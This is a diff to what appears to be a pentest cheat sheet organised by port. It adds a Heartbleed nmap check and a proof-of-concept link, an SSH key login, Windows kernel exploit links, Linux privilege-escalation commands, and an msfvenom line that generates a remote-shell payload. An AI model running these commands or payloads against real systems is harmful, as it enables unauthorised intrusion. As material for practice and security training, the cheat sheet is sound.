@@ -5,6 +5,15 @@
 
 
 
+## 22
+### ssh
+```sh
+chmod 600 id_rsa
+ssh -i id_rsa.txt 'USERNAME'@'IP'
+```
+
+
+
 ## 25
 ### swaks
 ```sh
@@ -117,10 +126,16 @@ netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodho
 
 
 ## 443
+### nmap
+```sh
+nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
+```
 ### sslscan
 ```sh
 sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 'IP'
 ```
+### PoC
+- [heartbleed](https://github.com/sensepost/heartbleed-poc)
 
 
 
@@ -222,6 +237,7 @@ netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
 
 ## escalation
 ### windows
+- [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-066)
 - [CVE-2009-0079](https://github.com/Re4son/Churrasco/)
 - https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-exploits.md
 - `https://github.com/abatchy17/WindowsExploits`
@@ -233,6 +249,10 @@ netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
 .\winPEASx64.exe userinfo quiet
 ```
 ### Linux
+### command
+```sh
+history
+```
 #### pspy
 ```sh
 ./pspy64
@@ -251,9 +271,17 @@ impacket-smbserver 'SHARENAME' 'PATH'
 # smbv1が無効の場合は
 impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```
+### msfvenom
+```sh
+msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o s 'OUTPUT'
+```
 ### name-that-hash
 ```sh
 name-that-hash -f 'hash.txt' --no-banner --no-john
+```
+### openssl
+```sh
+openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
 ```
 ### username-anarchy
 ```sh
